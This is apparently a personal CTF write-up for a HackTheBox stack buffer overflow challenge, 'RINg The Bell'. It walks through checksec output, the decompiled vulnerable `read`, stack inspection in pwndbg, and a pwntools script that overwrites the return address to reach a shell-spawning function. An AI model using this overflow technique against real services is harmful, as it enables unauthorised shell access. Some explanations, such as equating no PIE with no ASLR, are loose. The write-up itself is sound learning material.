---
title: "HackTheBox Cyber Apocalypse 2026: RINg The Bell"
description: "A simple binary exploitation problem that involves a stack-based buffer overflow"
date: 2026-07-24
category: ctf
tags: ["c", "pwn", "debugging"]
difficulty: easy
event: "HackTheBox"
featured: false
---

## Information Gathering

This was the first binary exploitation (pwn) I ever did, which I studied on the spot, but it's a good thing I have the fundamentals of x86 assembly fairly solidified. 

Since the challenge is a binary exploitation, the first thing we usually need to do is check security mitigations:

```bash
rei@DESKTOP-81ACF50:~/ctf/RINg the bell$ pixi run checksec ring_the_bell
[*] '/home/rei/ctf/RINg the bell/ring_the_bell'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This tells us a few things. A disabled stack canary means buffer overflows are possible, and no PIE means no memory randomization (ASLR) basically. I haven't tackled these concepts on my low-level studying yet so all of these descriptions are high-level. 

Since this is a pwn challenge, I did not use and do my recon tools like `strings` since this obviously involves a basic form of binary exploitation.

## Static Analysis With IDA 

We immediately go to the `main` function and inspect the decompilation:

```c
  _QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF

  puts(&s);
  info((unsigned int)"Rin! Ring the bell to call for reinforcements!\n\n[Rin]: ", (_DWORD)argv, v3, v4, v5, v6, buf[0]);
  fflush(stdout);
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x60u);
  info((unsigned int)"D-d-did they hear us..?\n", (unsigned int)buf, v7, v8, v9, v10, buf[0]);
  return 0;
```

The line `_QWORD buf[4];` and the line `read(0, buf, 0x60u);` is already a huge hint. We have just allocated 32 bytes of buffer, but we can `read` 96 bytes. That means we are able to put bytes beyond what the buffer can hold, which means we can overwrite what is written in memory beyond that. This specific line also means:

> Read from standard input (`stdin`), put it into the buffer, and can read 0x60 bytes (96 bytes).

The decompilation of the main function does not provide any more useful information other than this. The next step would be to look at other defined functions. There are a few, but one function's contents stands out:

```c 
int bell()
{
  return execl("/bin/sh", "sh", 0);
}
```

I immediately knew that we need to do something with this. I know that when this is executed, it gives us a shell. When we have a shell, we have access to the computer itself. 

## Dynamic Analysis with pwndbg

```assembly
Dump of assembler code for function main:
   0x000000000040179b <+0>:     endbr64
   0x000000000040179f <+4>:     push   rbp
   0x00000000004017a0 <+5>:     mov    rbp,rsp
   0x00000000004017a3 <+8>:     sub    rsp,0x20
=> 0x00000000004017a7 <+12>:    lea    rax,[rip+0x8c2]        # 0x402070
   0x00000000004017ae <+19>:    mov    rdi,rax
   0x00000000004017b1 <+22>:    call   0x401100 <puts@plt>
   0x00000000004017b6 <+27>:    lea    rax,[rip+0xe0b]        # 0x4025c8
   0x00000000004017bd <+34>:    mov    rdi,rax
   0x00000000004017c0 <+37>:    mov    eax,0x0
   0x00000000004017c5 <+42>:    call   0x4012ed <info>
   0x00000000004017ca <+47>:    mov    rax,QWORD PTR [rip+0x283f]        # 0x404010 <stdout@GLIBC_2.2.5>
   0x00000000004017d1 <+54>:    mov    rdi,rax
   0x00000000004017d4 <+57>:    call   0x401160 <fflush@plt>
   0x00000000004017d9 <+62>:    mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004017e1 <+70>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004017e9 <+78>:    mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004017f1 <+86>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004017f9 <+94>:    lea    rax,[rbp-0x20]
   0x00000000004017fd <+98>:    mov    edx,0x60
   0x0000000000401802 <+103>:   mov    rsi,rax
   0x0000000000401805 <+106>:   mov    edi,0x0
   0x000000000040180a <+111>:   call   0x401150 <read@plt>
   0x000000000040180f <+116>:   lea    rax,[rip+0xdea]        # 0x402600
   0x0000000000401816 <+123>:   mov    rdi,rax
   0x0000000000401819 <+126>:   mov    eax,0x0
   0x000000000040181e <+131>:   call   0x4012ed <info>
   0x0000000000401823 <+136>:   mov    eax,0x0
   0x0000000000401828 <+141>:   leave
   0x0000000000401829 <+142>:   ret
```

This is the disassembly for main. We break at the instruction `lea    rax,[rip+0xdea]` just after the `call` instruction to `read` because that is the time when we need to input something and it gets allocated into a 32-byte buffer. 

```assembly
pwndbg> x/10xg $rsp
0x7fffffffda50: 0x0000000000000a61      0x0000000000000000
0x7fffffffda60: 0x0000000000000000      0x0000000000000000
0x7fffffffda70: 0x00007fffffffdb20      0x00007ffff7c2a601
0x7fffffffda80: 0x00007fffffffdb60      0x00007fffffffdba8
0x7fffffffda90: 0x00000001ffffdba8      0x000000000040179b
```

I just tested typing one single character "a" (`0x61`) after the input. As you can see, we can see a lot of zeros. The line `memset(buf, 0, sizeof(buf));` zeroed out this specific buffer zone, and we can see it is exactly 32 bytes. The next series of 8 byte after that buffer is just the saved RBP. The next 8 bytes after that: `0x00007ffff7c2a601` Is the return address after main finishes. 

This means we need to pad 40 bytes of junk (32 bytes of buffer + 8 bytes for the saved RBP), and then the next 8 bytes should be the address of the `bell()` function which we overwrite the return address. So that when we hit these instructions:

```assembly
   0x0000000000401828 <+141>:   leave
   0x0000000000401829 <+142>:   ret
```

`ret` pops the return address off the stack, and jumps back to that location. If we overwrite our return address with the address of the `bell()` function, we are going to jump inside that function and execute the shell command.

## Scripting and Privilege Escalation

Using pwntools, this is the script that I used to craft the exploit.

```python
from pwn import *

p = remote('<IP-ADDRESS>', PORT-NUM)
padding = b'A' * 40

target_address = p64(0x40176d)

payload = padding + target_address

p.sendline(payload)

p.interactive()
```



